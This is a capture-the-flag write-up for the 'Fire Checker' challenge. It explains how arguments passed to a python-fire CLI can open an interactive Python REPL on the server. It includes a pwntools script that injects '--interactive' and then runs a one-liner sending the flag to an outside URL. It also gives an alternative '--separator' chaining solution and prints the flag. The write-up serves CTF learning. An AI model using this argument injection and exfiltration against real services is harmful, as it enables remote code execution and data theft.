# Fire Checker \[487 Points] (18 Solves)
```
It's so easy to make a secure flag checker, just check it on the server, duh...

Author: ahh
nc 34.139.98.117 6667 
```
---

## Writeup

[main.py](./fire_checker/app/main.py) just executes [chall.py](./fire_checker/app/chall.py)
with the parameters to set the flag and the inputted from us guess.
```py
try:
    out = subprocess.check_output(args, stderr=subprocess.DEVNULL, timeout=5).decode().strip()
    if out == f"Correct! {FLAG} is the flag!":
        print(out)
    else:
        raise Exception("Incorrect")
except:
    print("Nope!")

```
Let's look at `chall.py`
```py
import fire

def check_flag(flag, guess, *args, **kwargs):
    if flag == guess:
        return f"Correct! {guess} is the flag!"
    else:
        return f"Incorrect, you guessed {guess}, but the flag is {flag}."

if __name__ == '__main__':
    fire.Fire(check_flag)
```

It uses a library `fire`, which allows us to turn functions into CLI apps.

Reading it's docs we find out that it supports an **--interactive** flag which will
drop us into a _**python REPL**_. Thankfully, `main.py` doesn't redirect `chall`'s stdin
channel, thus we can just run a python command and exfiltrate the flag.

```py
from pwn import *

url = input("Please enter a url to receive the flag (like the one from https://public.requestbin.com): ")

io = connect("34.139.98.117", 6667)

io.sendlineafter("What is the flag? 🔥".encode(), "a -- --interactive".encode()) # --interactive launches a python REPL
sleep(1) # Make sure the REPL loaded
io.sendline(f"import sys, urllib.request; urllib.request.urlopen(f'{url}/{{sys.argv[2]}}').read(); exit()".encode())
```

**Flag:** L3AK{tR4NSF0RMS_iNBuiL7_1n_CLi5_WHO_KneW?!}

## Intended Solution

Written by @yannik9647
```
test ++ split ++ pop 0x8 ++ split '.' ++ pop 0x0 ++ join ["Correct!\x20","\x20is\x20the\x20flag!"] -- --separator ++
```

Uses `--separator` to execute functions on the output of the function.
So the following will happen:
- The function will return `Incorrect, you guessed test, but the flag is L3AK{tR4NSF0RMS_iNBuiL7_1n_CLi5_WHO_KneW?!}.`
- It is then split on spaces, and the last element is taken (split, pop 0x8) - this gets us `L3AK{tR4NSF0RMS_iNBuiL7_1n_CLi5_WHO_KneW?!}.`
- Repeat again with the dot to remove it - Now we have `L3AK{tR4NSF0RMS_iNBuiL7_1n_CLi5_WHO_KneW?!}.`
- Construct the "*Correct*" string using join - `Correct! L3AK{tR4NSF0RMS_iNBuiL7_1n_CLi5_WHO_KneW?!} is the flag!`
